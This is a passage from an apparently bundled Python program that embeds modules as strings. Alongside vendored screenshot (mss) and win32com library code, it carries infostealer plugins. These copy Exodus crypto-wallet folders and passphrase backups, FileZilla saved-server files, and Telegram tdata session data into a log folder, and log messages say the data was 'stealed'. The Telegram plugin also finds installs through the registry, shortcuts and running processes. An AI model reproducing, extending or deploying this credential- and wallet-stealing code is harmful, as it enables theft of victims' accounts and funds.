self._set_cfunctions()\n\n        self.root = self.xlib.XDefaultRootWindow(self._get_display(display))\n\n        if not self.has_extension("RANDR"):\n            raise ScreenShotError("No Xrandr extension found.")\n\n        # Fix for XRRGetScreenResources and XGetImage:\n        #     expected LP_Display instance instead of LP_XWindowAttributes\n        self.drawable = ctypes.cast(self.root, POINTER(Display))\n\n    def has_extension(self, extension):\n        # type: (str) -> bool\n        """Return True if the given *extension* is part of the extensions list of the server."""\n        with lock:\n            major_opcode_return = c_int()\n            first_event_return = c_int()\n            first_error_return = c_int()\n\n            try:\n                self.xlib.XQueryExtension(\n                    self._get_display(),\n                    extension.encode("latin1"),\n                    ctypes.byref(major_opcode_return),\n                    ctypes.byref(first_event_return),\n                    ctypes.byref(first_error_return),\n                )\n            except ScreenShotError:\n                return False\n            else:\n                return True\n\n    def _get_display(self, disp=None):\n        """\n        Retrieve a thread-safe display from XOpenDisplay().\n        In multithreading, if the thread who creates *display* is dead, *display* will\n        no longer be valid to grab the screen. The *display* attribute is replaced\n        with *_display_dict* to maintain the *display* values in multithreading.\n        Since the current thread and main thread are always alive, reuse their\n        *display* value first.\n        """\n        cur_thread, main_thread = threading.current_thread(), threading.main_thread()\n        display = MSS._display_dict.get(cur_thread) or MSS._display_dict.get(\n            main_thread\n        )\n        if not display:\n            display = MSS._display_dict[cur_thread] = self.xlib.XOpenDisplay(disp)\n        return display\n\n    def _set_cfunctions(self):\n        """ Set all ctypes functions and attach them to attributes. """\n\n        cfactory = self._cfactory\n        attrs = {\n            "xlib": self.xlib,\n            "xrandr": self.xrandr,\n        }\n        for func, (attr, argtypes, restype) in CFUNCTIONS.items():\n            try:\n                cfactory(\n                    attr=attrs[attr],\n                    errcheck=validate,\n                    func=func,\n                    argtypes=argtypes,\n                    restype=restype,\n                )  # type: ignore\n            except AttributeError:\n                pass\n\n    def get_error_details(self):\n        # type: () -> Optional[Dict[str, Any]]\n        """ Get more information about the latest X server error. """\n\n        details = {}  # type: Dict[str, Any]\n\n        if ERROR.details:\n            details = {"xerror_details": ERROR.details}\n            ERROR.details = None\n            xserver_error = ctypes.create_string_buffer(1024)\n            self.xlib.XGetErrorText(\n                self._get_display(),\n                details.get("xerror_details", {}).get("error_code", 0),\n                xserver_error,\n                len(xserver_error),\n            )\n            xerror = xserver_error.value.decode("utf-8")\n            if xerror != "0":\n                details["xerror"] = xerror\n\n        return details\n\n    def _monitors_impl(self):\n        # type: () -> None\n        """ Get positions of monitors. It will populate self._monitors. """\n\n        display = self._get_display()\n        int_ = int\n        xrandr = self.xrandr\n\n        # All monitors\n        gwa = XWindowAttributes()\n        self.xlib.XGetWindowAttributes(display, self.root, ctypes.byref(gwa))\n        self._monitors.append(\n            {\n                "left": int_(gwa.x),\n                "top": int_(gwa.y),\n                "width": int_(gwa.width),\n                "height": int_(gwa.height),\n            }\n        )\n\n        # Each monitors\n        # A simple benchmark calling 10 times those 2 functions:\n        # XRRGetScreenResources():        0.1755971429956844 s\n        # XRRGetScreenResourcesCurrent(): 0.0039125580078689 s\n        # The second is faster by a factor of 44! So try to use it first.\n        try:\n            mon = xrandr.XRRGetScreenResourcesCurrent(display, self.drawable).contents\n        except AttributeError:\n            mon = xrandr.XRRGetScreenResources(display, self.drawable).contents\n\n        crtcs = mon.crtcs\n        for idx in range(mon.ncrtc):\n            crtc = xrandr.XRRGetCrtcInfo(display, mon, crtcs[idx]).contents\n            if crtc.noutput == 0:\n                xrandr.XRRFreeCrtcInfo(crtc)\n                continue\n\n            self._monitors.append(\n                {\n                    "left": int_(crtc.x),\n                    "top": int_(crtc.y),\n                    "width": int_(crtc.width),\n                    "height": int_(crtc.height),\n                }\n            )\n            xrandr.XRRFreeCrtcInfo(crtc)\n        xrandr.XRRFreeScreenResources(mon)\n\n    def _grab_impl(self, monitor):\n        # type: (Monitor) -> ScreenShot\n        """ Retrieve all pixels from a monitor. Pixels have to be RGB. """\n\n        ximage = self.xlib.XGetImage(\n            self._get_display(),\n            self.drawable,\n            monitor["left"],\n            monitor["top"],\n            monitor["width"],\n            monitor["height"],\n            PLAINMASK,\n            ZPIXMAP,\n        )\n\n        try:\n            bits_per_pixel = ximage.contents.bits_per_pixel\n            if bits_per_pixel != 32:\n                raise ScreenShotError(\n                    "[XImage] bits per pixel value not (yet?) implemented: {}.".format(\n                        bits_per_pixel\n                    )\n                )\n\n            raw_data = ctypes.cast(\n                ximage.contents.data,\n                POINTER(c_ubyte * monitor["height"] * monitor["width"] * 4),\n            )\n            data = bytearray(raw_data.contents)\n        finally:\n            # Free\n            self.xlib.XDestroyImage(ximage)\n\n        return self.cls_image(data, monitor)\n')
    __stickytape_write_module('mss/windows.py', b'"""\nThis is part of the MSS Python\'s module.\nSource: https://github.com/BoboTiG/python-mss\n"""\n\nimport sys\nimport ctypes\nimport threading\nfrom ctypes import POINTER, Structure, WINFUNCTYPE, c_void_p\nfrom ctypes.wintypes import (\n    BOOL,\n    DOUBLE,\n    DWORD,\n    HBITMAP,\n    HDC,\n    HGDIOBJ,\n    HWND,\n    INT,\n    LONG,\n    LPARAM,\n    RECT,\n    UINT,\n    WORD,\n)\nfrom typing import TYPE_CHECKING\n\nfrom .base import MSSBase\nfrom .exception import ScreenShotError\n\nif TYPE_CHECKING:\n    from typing import Any, Dict  # noqa\n\n    from .models import Monitor, Monitors  # noqa\n    from .screenshot import ScreenShot  # noqa\n\n__all__ = ("MSS",)\n\n\nCAPTUREBLT = 0x40000000\nDIB_RGB_COLORS = 0\nSRCCOPY = 0x00CC0020\n\n\nclass BITMAPINFOHEADER(Structure):\n    """ Information about the dimensions and color format of a DIB. """\n\n    _fields_ = [\n        ("biSize", DWORD),\n        ("biWidth", LONG),\n        ("biHeight", LONG),\n        ("biPlanes", WORD),\n        ("biBitCount", WORD),\n        ("biCompression", DWORD),\n        ("biSizeImage", DWORD),\n        ("biXPelsPerMeter", LONG),\n        ("biYPelsPerMeter", LONG),\n        ("biClrUsed", DWORD),\n        ("biClrImportant", DWORD),\n    ]\n\n\nclass BITMAPINFO(Structure):\n    """\n    Structure that defines the dimensions and color information for a DIB.\n    """\n\n    _fields_ = [("bmiHeader", BITMAPINFOHEADER), ("bmiColors", DWORD * 3)]\n\n\nMONITORNUMPROC = WINFUNCTYPE(INT, DWORD, DWORD, POINTER(RECT), DOUBLE)\n\n\n# C functions that will be initialised later.\n#\n# This is a dict:\n#    cfunction: (attr, argtypes, restype)\n#\n# Available attr: gdi32, user32.\n#\n# Note: keep it sorted by cfunction.\nCFUNCTIONS = {\n    "BitBlt": ("gdi32", [HDC, INT, INT, INT, INT, HDC, INT, INT, DWORD], BOOL),\n    "CreateCompatibleBitmap": ("gdi32", [HDC, INT, INT], HBITMAP),\n    "CreateCompatibleDC": ("gdi32", [HDC], HDC),\n    "DeleteObject": ("gdi32", [HGDIOBJ], INT),\n    "EnumDisplayMonitors": ("user32", [HDC, c_void_p, MONITORNUMPROC, LPARAM], BOOL),\n    "GetDeviceCaps": ("gdi32", [HWND, INT], INT),\n    "GetDIBits": (\n        "gdi32",\n        [HDC, HBITMAP, UINT, UINT, c_void_p, POINTER(BITMAPINFO), UINT],\n        BOOL,\n    ),\n    "GetSystemMetrics": ("user32", [INT], INT),\n    "GetWindowDC": ("user32", [HWND], HDC),\n    "SelectObject": ("gdi32", [HDC, HGDIOBJ], HGDIOBJ),\n}\n\n\nclass MSS(MSSBase):\n    """ Multiple ScreenShots implementation for Microsoft Windows. """\n\n    __slots__ = {"_bbox", "_bmi", "_data", "gdi32", "user32"}\n\n    # Class attributes instanced one time to prevent resource leaks.\n    bmp = None\n    memdc = None\n\n    # A dict to maintain *srcdc* values created by multiple threads.\n    _srcdc_dict = {}  # type: Dict[threading.Thread, int]\n\n    def __init__(self, **_):\n        # type: (Any) -> None\n        """ Windows initialisations. """\n\n        super().__init__()\n\n        self.user32 = ctypes.WinDLL("user32")\n        self.gdi32 = ctypes.WinDLL("gdi32")\n        self._set_cfunctions()\n        self._set_dpi_awareness()\n\n        self._bbox = {"height": 0, "width": 0}\n        self._data = ctypes.create_string_buffer(0)  # type: ctypes.Array[ctypes.c_char]\n\n        srcdc = self._get_srcdc()\n        if not MSS.memdc:\n            MSS.memdc = self.gdi32.CreateCompatibleDC(srcdc)\n\n        bmi = BITMAPINFO()\n        bmi.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)\n        bmi.bmiHeader.biPlanes = 1  # Always 1\n        bmi.bmiHeader.biBitCount = 32  # See grab.__doc__ [2]\n        bmi.bmiHeader.biCompression = 0  # 0 = BI_RGB (no compression)\n        bmi.bmiHeader.biClrUsed = 0  # See grab.__doc__ [3]\n        bmi.bmiHeader.biClrImportant = 0  # See grab.__doc__ [3]\n        self._bmi = bmi\n\n    def _set_cfunctions(self):\n        """ Set all ctypes functions and attach them to attributes. """\n\n        cfactory = self._cfactory\n        attrs = {\n            "gdi32": self.gdi32,\n            "user32": self.user32,\n        }\n        for func, (attr, argtypes, restype) in CFUNCTIONS.items():\n            cfactory(\n                attr=attrs[attr],\n                func=func,\n                argtypes=argtypes,\n                restype=restype,\n            )  # type: ignore\n\n    def _set_dpi_awareness(self):\n        """ Set DPI aware to capture full screen on Hi-DPI monitors. """\n\n        version = sys.getwindowsversion()[:2]  # pylint: disable=no-member\n        if version >= (6, 3):\n            # Windows 8.1+\n            # Here 2 = PROCESS_PER_MONITOR_DPI_AWARE, which means:\n            #     per monitor DPI aware. This app checks for the DPI when it is\n            #     created and adjusts the scale factor whenever the DPI changes.\n            #     These applications are not automatically scaled by the system.\n            ctypes.windll.shcore.SetProcessDpiAwareness(2)\n        elif (6, 0) <= version < (6, 3):\n            # Windows Vista, 7, 8 and Server 2012\n            self.user32.SetProcessDPIAware()\n\n    def _get_srcdc(self):\n        """\n        Retrieve a thread-safe HDC from GetWindowDC().\n        In multithreading, if the thread who creates *srcdc* is dead, *srcdc* will\n        no longer be valid to grab the screen. The *srcdc* attribute is replaced\n        with *_srcdc_dict* to maintain the *srcdc* values in multithreading.\n        Since the current thread and main thread are always alive, reuse their *srcdc* value first.\n        """\n        cur_thread, main_thread = threading.current_thread(), threading.main_thread()\n        srcdc = MSS._srcdc_dict.get(cur_thread) or MSS._srcdc_dict.get(main_thread)\n        if not srcdc:\n            srcdc = MSS._srcdc_dict[cur_thread] = self.user32.GetWindowDC(0)\n        return srcdc\n\n    def _monitors_impl(self):\n        # type: () -> None\n        """ Get positions of monitors. It will populate self._monitors. """\n\n        int_ = int\n        user32 = self.user32\n        get_system_metrics = user32.GetSystemMetrics\n\n        # All monitors\n        self._monitors.append(\n            {\n                "left": int_(get_system_metrics(76)),  # SM_XVIRTUALSCREEN\n                "top": int_(get_system_metrics(77)),  # SM_YVIRTUALSCREEN\n                "width": int_(get_system_metrics(78)),  # SM_CXVIRTUALSCREEN\n                "height": int_(get_system_metrics(79)),  # SM_CYVIRTUALSCREEN\n            }\n        )\n\n        # Each monitors\n        def _callback(monitor, data, rect, dc_):\n            # types: (int, HDC, LPRECT, LPARAM) -> int\n            """\n            Callback for monitorenumproc() function, it will return\n            a RECT with appropriate values.\n            """\n            # pylint: disable=unused-argument\n\n            rct = rect.contents\n            self._monitors.append(\n                {\n                    "left": int_(rct.left),\n                    "top": int_(rct.top),\n                    "width": int_(rct.right - rct.left),\n                    "height": int_(rct.bottom - rct.top),\n                }\n            )\n            return 1\n\n        callback = MONITORNUMPROC(_callback)\n        user32.EnumDisplayMonitors(0, 0, callback, 0)\n\n    def _grab_impl(self, monitor):\n        # type: (Monitor) -> ScreenShot\n        """\n        Retrieve all pixels from a monitor. Pixels have to be RGB.\n\n        In the code, there are few interesting things:\n\n        [1] bmi.bmiHeader.biHeight = -height\n\n        A bottom-up DIB is specified by setting the height to a\n        positive number, while a top-down DIB is specified by\n        setting the height to a negative number.\n        https://msdn.microsoft.com/en-us/library/ms787796.aspx\n        https://msdn.microsoft.com/en-us/library/dd144879%28v=vs.85%29.aspx\n\n\n        [2] bmi.bmiHeader.biBitCount = 32\n            image_data = create_string_buffer(height * width * 4)\n\n        We grab the image in RGBX mode, so that each word is 32bit\n        and we have no striding.\n        Inspired by https://github.com/zoofIO/flexx\n\n\n        [3] bmi.bmiHeader.biClrUsed = 0\n            bmi.bmiHeader.biClrImportant = 0\n\n        When biClrUsed and biClrImportant are set to zero, there\n        is "no" color table, so we can read the pixels of the bitmap\n        retrieved by gdi32.GetDIBits() as a sequence of RGB values.\n        Thanks to http://stackoverflow.com/a/3688682\n        """\n\n        srcdc, memdc = self._get_srcdc(), MSS.memdc\n        width, height = monitor["width"], monitor["height"]\n\n        if (self._bbox["height"], self._bbox["width"]) != (height, width):\n            self._bbox = monitor\n            self._bmi.bmiHeader.biWidth = width\n            self._bmi.bmiHeader.biHeight = -height  # Why minus? [1]\n            self._data = ctypes.create_string_buffer(width * height * 4)  # [2]\n            if MSS.bmp:\n                self.gdi32.DeleteObject(MSS.bmp)\n            MSS.bmp = self.gdi32.CreateCompatibleBitmap(srcdc, width, height)\n            self.gdi32.SelectObject(memdc, MSS.bmp)\n\n        self.gdi32.BitBlt(\n            memdc,\n            0,\n            0,\n            width,\n            height,\n            srcdc,\n            monitor["left"],\n            monitor["top"],\n            SRCCOPY | CAPTUREBLT,\n        )\n        bits = self.gdi32.GetDIBits(\n            memdc, MSS.bmp, 0, height, self._data, self._bmi, DIB_RGB_COLORS\n        )\n        if bits != height:\n            raise ScreenShotError("gdi32.GetDIBits() failed.")\n\n        return self.cls_image(bytearray(self._data), monitor)\n')
    __stickytape_write_module('plugins/wallets/__init__.py', b'from .exodus import Exodus')
    __stickytape_write_module('plugins/wallets/exodus.py', b'from plugins import Plugin\r\nfrom config import Config\r\nfrom os.path import isdir, join\r\nfrom os import mkdir, walk\r\nfrom secrets import token_hex\r\nfrom tools import copytree, copyfile\r\n\r\n\r\n\r\nclass Exodus(Plugin):\r\n    def __init__(self, conf: Config) -> None:\r\n        self.conf = conf\r\n\r\n\r\n    async def callback(self, path: str) -> None:\r\n        if not isdir(path):\r\n            return\r\n\r\n        wallets_path = join(self.conf.log_path, \'wallets\')\r\n        if not isdir(wallets_path):\r\n            mkdir(wallets_path)\r\n        \r\n        log_exodus_path = join(wallets_path, f\'exodus_{token_hex(4)}\')\r\n\r\n        wallet_folder = join(path, \'exodus.wallet\')\r\n        if isdir(wallet_folder):\r\n            await copytree(wallet_folder, log_exodus_path)\r\n            \r\n            await self.conf.logger.log(f\'\xd0\xa1\xd0\xbf\xd0\xb8\xd0\xb7\xd0\xb6\xd0\xb5\xd0\xbd exodus \xd1\x81 {path}\')\r\n\r\n        bacukps_folder = join(path, \'backups\')\r\n        for dirpath, dirnames, filenames in walk(bacukps_folder):\r\n            for f in filenames:\r\n                if f == "passphrase.json":\r\n                    if not isdir(log_exodus_path):\r\n                        mkdir(log_exodus_path)\r\n                    \r\n                    await copyfile(join(dirpath, f), join(log_exodus_path, f\'passphrase_{token_hex(4)}.json\'))')
    __stickytape_write_module('plugins/wallets/Exodus.py', b'from plugins import Plugin\r\nfrom config import Config\r\nfrom os.path import isdir, join\r\nfrom os import mkdir, walk\r\nfrom secrets import token_hex\r\nfrom tools import copytree, copyfile\r\n\r\n\r\n\r\nclass Exodus(Plugin):\r\n    def __init__(self, conf: Config) -> None:\r\n        self.conf = conf\r\n\r\n\r\n    async def callback(self, path: str) -> None:\r\n        if not isdir(path):\r\n            return\r\n\r\n        wallets_path = join(self.conf.log_path, \'wallets\')\r\n        if not isdir(wallets_path):\r\n            mkdir(wallets_path)\r\n        \r\n        log_exodus_path = join(wallets_path, f\'exodus_{token_hex(4)}\')\r\n\r\n        wallet_folder = join(path, \'exodus.wallet\')\r\n        if isdir(wallet_folder):\r\n            await copytree(wallet_folder, log_exodus_path)\r\n            \r\n            await self.conf.logger.log(f\'\xd0\xa1\xd0\xbf\xd0\xb8\xd0\xb7\xd0\xb6\xd0\xb5\xd0\xbd exodus \xd1\x81 {path}\')\r\n\r\n        bacukps_folder = join(path, \'backups\')\r\n        for dirpath, dirnames, filenames in walk(bacukps_folder):\r\n            for f in filenames:\r\n                if f == "passphrase.json":\r\n                    if not isdir(log_exodus_path):\r\n                        mkdir(log_exodus_path)\r\n                    \r\n                    await copyfile(join(dirpath, f), join(log_exodus_path, f\'passphrase_{token_hex(4)}.json\'))')
    __stickytape_write_module('plugins/filezilla.py', b"from plugins import Plugin\r\nfrom config import Config\r\nfrom os.path import isdir, join\r\nfrom os import mkdir, scandir\r\nfrom secrets import token_hex\r\nfrom tools import copyfile\r\n\r\n\r\n\r\nclass Filezilla(Plugin):\r\n    def __init__(self, conf: Config) -> None:\r\n        self.conf = conf\r\n\r\n\r\n    async def callback(self, path: str) -> None:\r\n        if not isdir(path):\r\n            return\r\n\r\n        search = {'recentservers.xml', 'sitemanager.xml'}\r\n        files = search.intersection(i.name for i in scandir(path))\r\n\r\n        if not files:\r\n            return\r\n\r\n        res_path = join(self.conf.log_path, 'filezilla')\r\n        if not isdir(res_path):\r\n            mkdir(res_path)\r\n        \r\n        for f in files:\r\n            filename = f.split('.')[0]\r\n            dest_path = join(res_path, f'{filename}_{token_hex(4)}.xml')\r\n            await copyfile(join(path, f), dest_path)\r\n\r\n        await self.conf.logger.log(f'Filezilla stealed from {path}')")
    __stickytape_write_module('plugins/telegram.py', b'from plugins import Plugin\r\nfrom config import Config\r\nfrom os.path import isdir, join, normpath\r\nfrom os import mkdir, scandir\r\nfrom secrets import token_hex\r\nfrom tools import copyfile, copytree\r\nimport winreg\r\nimport re\r\nfrom paths import LOCAL\r\nimport win32com.client\r\nimport psutil\r\nfrom os.path import split\r\n\r\n\r\n\r\nclass Telegram(Plugin):\r\n    STEALED = set()\r\n\r\n\r\n    def __init__(self, conf: Config) -> None:\r\n        self.conf = conf\r\n\r\n    async def callback(self, path: str) -> None:\r\n        path_ = normpath(path.lower())\r\n        if path_ in Telegram.STEALED:\r\n            return\r\n        else:\r\n            Telegram.STEALED.add(path_)\r\n        \r\n        if not isdir(path):\r\n            return\r\n\r\n        tdata_path = join(path, \'tdata\')\r\n        if not isdir(tdata_path):\r\n            return\r\n\r\n        telegram_path = join(self.conf.log_path, \'telegram\')\r\n        if not isdir(telegram_path):\r\n            mkdir(telegram_path)\r\n\r\n        res_path = join(telegram_path, f\'tdata_{token_hex(4)}\')\r\n        mkdir(res_path)\r\n\r\n        blacklist = [\'dumps\', \'emoji\', \'user_data\', \'working\']\r\n\r\n        for f in scandir(tdata_path):\r\n            file_ok = True\r\n            for i in blacklist:\r\n                if i in f.name:\r\n                    file_ok = False\r\n                    break\r\n            \r\n            if not file_ok:\r\n                continue\r\n            \r\n            from_path = join(tdata_path, f.name)\r\n            dest_path = join(res_path, f.name)\r\n\r\n            func = copyfile if f.is_file() else copytree\r\n            await func(from_path, dest_path)\r\n\r\n        await self.conf.logger.log(f\'Telegram stealed from {path}\')\r\n\r\n    @staticmethod\r\n    def get_registry_path():\r\n        path = winreg.HKEY_CLASSES_ROOT\r\n\r\n        tg = winreg.OpenKeyEx(path, r"tdesktop.tg\\\\")\r\n        shell = winreg.OpenKeyEx(tg, r\'shell\\\\\')\r\n        open_rg = winreg.OpenKeyEx(shell, r\'open\\\\\')\r\n        key = winreg.OpenKeyEx(open_rg, r\'command\\\\\')\r\n\r\n        value = winreg.EnumValue(key, 0)\r\n\r\n        path = re.findall(r\'"([^"]*)\', value[1])[2]\r\n        return path\r\n        \r\n    @staticmethod\r\n    def get_lnk_path():\r\n        desktop = join(LOCAL, \'desktop\')\r\n\r\n        for it in scandir(desktop):\r\n            if it.name.split(\'.\')[-1] == \'lnk\' and \'telegram\' in it.name.lower():\r\n                shell = win32com.client.Dispatch("WScript.Shell")\r\n                shortcut = shell.CreateShortCut(it.path)\r\n                path = shortcut.Targetpath.lower().strip(\'telegram.exe\')\r\n                return path\r\n\r\n    @staticmethod\r\n    def get_telegrams():\r\n        for proc in psutil.process_iter():\r\n            if \'telegram\' in proc.name().lower():\r\n                try:\r\n                    yield split(proc.exe())[0]\r\n                except:\r\n                    pass')
    __stickytape_write_module('win32com/__init__.py', b'#\n# Initialization for the win32com package\n#\n\nimport win32api, sys, os\nimport pythoncom\n\n# flag if we are in a "frozen" build.\n_frozen = getattr(sys, "frozen", 1 == 0)\n# pythoncom dumbly defaults this to zero - we believe sys.frozen over it.\nif _frozen and not getattr(pythoncom, "frozen", 0):\n    pythoncom.frozen = sys.frozen\n\n# Add support for an external "COM Extensions" path.\n#  Concept is that you can register a seperate path to be used for\n#  COM extensions, outside of the win32com directory.  These modules, however,\n#  look identical to win32com built-in modules.\n#  This is the technique that we use for the "standard" COM extensions.\n#  eg "win32com.mapi" or "win32com.axscript" both work, even though they do not\n#  live under the main win32com directory.\n__gen_path__ = ""\n__build_path__ = None\n### TODO - Load _all_ \\\\Extensions subkeys - for now, we only read the default\n### Modules will work if loaded into "win32comext" path.\n\n\ndef SetupEnvironment():\n    HKEY_LOCAL_MACHINE = -2147483646  # Avoid pulling in win32con for just these...\n    KEY_QUERY_VALUE = 0x1\n    # Open the root key once, as this is quite slow on NT.\n    try:\n        keyName = "SOFTWARE\\\\Python\\\\PythonCore\\\\%s\\\\PythonPath\\\\win32com" % sys.winver\n        key = win32api.RegOpenKey(HKEY_LOCAL_MACHINE, keyName, 0, KEY_QUERY_VALUE)\n    except (win32api.error, AttributeError):\n        key = None\n\n    try:\n        found = 0\n        if key is not None:\n            try:\n                __path__.append(win32api.RegQueryValue(key, "Extensions"))\n                found = 1\n            except win32api.error:\n                # Nothing registered\n                pass\n        if not found:\n            try:\n                __path__.append(\n                    win32api.GetFullPathName(__path__[0] + "\\\\..\\\\win32comext")\n                )\n            except win32api.error:\n                # Give up in disgust!\n                pass\n\n        # For the sake of developers, we also look up a "BuildPath" key\n        # If extension modules add support, we can load their .pyd\'s from a completely\n        # different directory (see the comments below)\n        try:\n            if key is not None:\n                global __build_path__\n                __build_path__ = win32api.RegQueryValue(key, "BuildPath")\n                __path__.append(__build_path__)\n        except win32api.error:\n            # __build_path__ neednt be defined.\n            pass\n        global __gen_path__\n        if key is not None:\n            try:\n                __gen_path__ = win32api.RegQueryValue(key, "GenPath")\n            except win32api.error:\n                pass\n    finally:\n        if key is not None:\n            key.Close()\n\n\n# A Helper for developers.  A sub-package\'s __init__ can call this help function,\n# which allows the .pyd files for the extension to live in a special "Build" directory\n# (which the win32com developers do!)\ndef __PackageSupportBuildPath__(package_path):\n    # See if we have a special directory for the binaries (for developers)\n    if not _frozen and __build_path__:\n        package_path.append(__build_path__)\n\n\nif not _frozen:\n    SetupEnvironment()\n\n# If we don\'t have a special __gen_path__, see if we have a gen_py as a\n# normal module and use that (ie, "win32com.gen_py" may already exist as\n# a package.\nif not __gen_path__:\n    try:\n        import win32com.gen_py\n\n        # hrmph - 3.3 throws: TypeError: \'_NamespacePath\' object does not support indexing\n        # attempting to get __path__[0] - but I can\'t quickly repro this stand-alone.\n        # Work around it by using an iterator.\n        __gen_path__ = next(iter(sys.modules["win32com.gen_py"].__path__))\n    except ImportError:\n        # If a win32com\\gen_py directory already exists, then we use it\n        # (gencache doesn\'t insist it have an __init__, but our __import__\n        # above does!\n        __gen_path__ = os.path.abspath(os.path.join(__path__[0], "gen_py"))\n        if not os.path.isdir(__gen_path__):\n            # We used to dynamically create a directory under win32com -\n            # but this sucks.  If the dir doesn\'t already exist, we we\n            # create a version specific directory under the user temp\n            # directory.\n            __gen_path__ = os.path.join(\n                win32api.GetTempPath(),\n                "gen_py",\n                "%d.%d" % (sys.version_info[0], sys.version_info[1]),\n            )\n\n# we must have a __gen_path__, but may not have a gen_py module -\n# set that up.\nif "win32com.gen_py" not in sys.modules:\n    # Create a "win32com.gen_py", but with a custom __path__\n    import types\n\n    gen_py = types.ModuleType("win32com.gen_py")\n    gen_py.__path__ = [__gen_path__]\n    sys.modules[gen_py.__name__] = gen_py\n    del types\ngen_py = sys.modules["win32com.gen_py"]\n\n# get rid of these for module users\ndel os, sys, win32api, pythoncom\n')
    __stickytape_write_module('pythoncom.py', b'# Magic utility that "redirects" to pythoncomxx.dll\nimport pywintypes\n\npywintypes.__import_pywin32_system_module__("pythoncom", globals())\n')
    __stickytape_write_module('win32com/client/__init__.py', b'# This module exists to create the "best" dispatch object for a given\n# object.  If "makepy" support for a given object is detected, it is\n# used, otherwise a dynamic dispatch object.\n\n# Note that if the unknown dispatch object then returns a known\n# dispatch object, the known class will be used.  This contrasts\n# with dynamic.Dispatch behaviour, where dynamic objects are always used.\n\nimport pythoncom\nfrom . import dynamic\nfrom . import gencache\nimport sys\nimport pywintypes\n\n_PyIDispatchType = pythoncom.TypeIIDs[pythoncom.IID_IDispatch]\n\n\ndef __WrapDispatch(\n    dispatch,\n    userName=None,\n    resultCLSID=None,\n    typeinfo=None,\n    UnicodeToString=None,\n    clsctx=pythoncom.CLSCTX_SERVER,\n    WrapperClass=None,\n):\n    """\n    Helper function to return a makepy generated class for a CLSID if it exists,\n    otherwise cope by using CDispatch.\n    """\n    assert UnicodeToString is None, "this is deprecated and will go away"\n    if resultCLSID is None:\n        try:\n            typeinfo = dispatch.GetTypeInfo()\n            if (\n                typeinfo is not None\n            ):  # Some objects return NULL, some raise exceptions...\n                resultCLSID = str(typeinfo.GetTypeAttr()[0])\n        except (pythoncom.com_error, AttributeError):\n            pass\n    if resultCLSID is not None:\n        from . import gencache\n\n        # Attempt to load generated module support\n        # This may load the module, and make it available\n        klass = gencache.GetClassForCLSID(resultCLSID)\n        if klass is not None:\n            return klass(dispatch)\n\n    # Return a "dynamic" object - best we can do!\n    if WrapperClass is None:\n        WrapperClass = CDispatch\n    return dynamic.Dispatch(dispatch, userName, WrapperClass, typeinfo, clsctx=clsctx)\n\n\ndef GetObject(Pathname=None, Class=None, clsctx=None):\n    """\n    Mimic VB\'s GetObject() function.\n\n    ob = GetObject(Class = "ProgID") or GetObject(Class = clsid) will\n    connect to an already running instance of the COM object.\n\n    ob = GetObject(r"c:\\blah\\blah\\foo.xls") (aka the COM moniker syntax)\n    will return a ready to use Python wrapping of the required COM object.\n\n    Note: You must specifiy one or the other of these arguments. I know\n    this isn\'t pretty, but it is what VB does. Blech. If you don\'t\n    I\'ll throw ValueError at you. :)\n\n    This will most likely throw pythoncom.com_error if anything fails.\n    """\n    if clsctx is None:\n        clsctx = pythoncom.CLSCTX_ALL\n\n    if (Pathname is None and Class is None) or (\n        Pathname is not None and Class is not None\n    ):\n        raise ValueError(\n            "You must specify a value for Pathname or Class, but not both."\n        )\n\n    if Class is not None:\n        return GetActiveObject(Class, clsctx)\n    else:\n        return Moniker(Pathname, clsctx)\n\n\ndef GetActiveObject(Class, clsctx=pythoncom.CLSCTX_ALL):\n    """\n    Python friendly version of GetObject\'s ProgID/CLSID functionality.\n    """\n    resultCLSID = pywintypes.IID(Class)\n    dispatch = pythoncom.GetActiveObject(resultCLSID)\n    dispatch = dispatch.QueryInterface(pythoncom.IID_IDispatch)\n    return __WrapDispatch(dispatch, Class, resultCLSID=resultCLSID, clsctx=clsctx)\n\n\ndef Moniker(Pathname, clsctx=pythoncom.CLSCTX_ALL):\n    """\n    Python friendly version of GetObject\'s moniker functionality.\n    """\n    moniker, i, bindCtx = pythoncom.MkParseDisplayName(Pathname)\n    dispatch = moniker.BindToObject(bindCtx, None, pythoncom.IID_IDispatch)\n    return __WrapDispatch(dispatch, Pathname, clsctx=clsctx)\n\n\ndef Dispatch(\n    dispatch,\n    userName=None,\n    resultCLSID=None,\n    typeinfo=None,\n    UnicodeToString=None,\n    clsctx=pythoncom.CLSCTX_SERVER,\n):\n    """Creates a Dispatch based COM object."""\n    assert UnicodeToString is None, "this is deprecated and will go away"\n    dispatch, userName = dynamic._GetGoodDispatchAndUserName(dispatch, userName, clsctx)\n    return __WrapDispatch(dispatch, userName, resultCLSID, typeinfo, clsctx=clsctx)\n\n\ndef DispatchEx(\n    clsid,\n    machine=None,\n    userName=None,\n    resultCLSID=None,\n    typeinfo=None,\n    UnicodeToString=None,\n    clsctx=None,\n):\n    """Creates a Dispatch based COM object on a specific machine."""\n    assert UnicodeToString is None, "this is deprecated and will go away"\n    # If InProc is registered, DCOM will use it regardless of the machine name\n    # (and regardless of the DCOM config for the object.)  So unless the user\n    # specifies otherwise, we exclude inproc apps when a remote machine is used.\n    if clsctx is None:\n        clsctx = pythoncom.CLSCTX_SERVER\n        if machine is not None:\n            clsctx = clsctx & ~pythoncom.CLSCTX_INPROC\n    if machine is None:\n        serverInfo = None\n    else:\n        serverInfo = (machine,)\n    if userName is None:\n        userName = clsid\n    dispatch = pythoncom.CoCreateInstanceEx(\n        clsid, None, clsctx, serverInfo, (pythoncom.IID_IDispatch,)\n    )[0]\n    return Dispatch(dispatch, userName, resultCLSID, typeinfo, clsctx=clsctx)\n\n\nclass CDispatch(dynamic.CDispatch):\n    """\n    The dynamic class used as a last resort.\n    The purpose of this overriding of dynamic.CDispatch is to perpetuate the policy\n    of using the makepy generated wrapper Python class instead of dynamic.CDispatch\n    if/when possible.\n    """\n\n    def _wrap_dispatch_(\n        self, ob, userName=None, returnCLSID=None, UnicodeToString=None\n    ):\n        assert UnicodeToString is None, "this is deprecated and will go away"\n        return Dispatch(ob, userName, returnCLSID, None)\n\n    def __dir__(self):\n        return dynamic.CDispatch.__dir__(self)\n\n\ndef CastTo(ob, target, typelib=None):\n    """\'Cast\' a COM object to another interface"""\n    # todo - should support target being an IID\n    mod = None\n    if (\n        typelib is not None\n    ):  # caller specified target typelib (TypelibSpec). See e.g. selecttlb.EnumTlbs().\n        mod = gencache.MakeModuleForTypelib(\n            typelib.clsid, typelib.lcid, int(typelib.major, 16), int(typelib.minor, 16)\n        )\n        if not hasattr(mod, target):\n            raise 